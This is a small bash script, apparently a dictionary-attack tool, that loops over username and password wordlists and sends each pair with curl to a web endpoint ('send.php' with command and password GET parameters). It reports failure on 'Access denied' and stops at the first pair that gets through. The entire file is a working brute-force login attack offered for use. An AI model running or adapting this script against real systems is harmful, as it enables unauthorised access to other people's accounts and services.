#!/bin/bash

if [[ ${#@} != 1 ]]; then
    echo "USAGE $0 <host+GET params>"
    echo "$0 http://192.168.1.100/index.php?command=ls&password=secret"
    exit
fi


ip=$1
#User and pasword dictinaries
usernames="users.txt"
passwords="passwords.txt"

for name in $(cat $usernames); do #name iteration
    for password in $(cat $passwords); do #passwird iteration
        echo -ne  "$name $password"
        res=$(curl -s --request GET "$1/send.php?command=$name&p=$password")
        check=$(echo $res | grep "Access denied")
        if [[ $check != "" ]]; then
            tput setaf 1 # Colorise output
            echo " [FAILED]"
            tput sgr 0
        else
            tput setaf 2
            echo " [SUCCESS]"
            tput sgr 0
            exit                          
        fi

    done
done


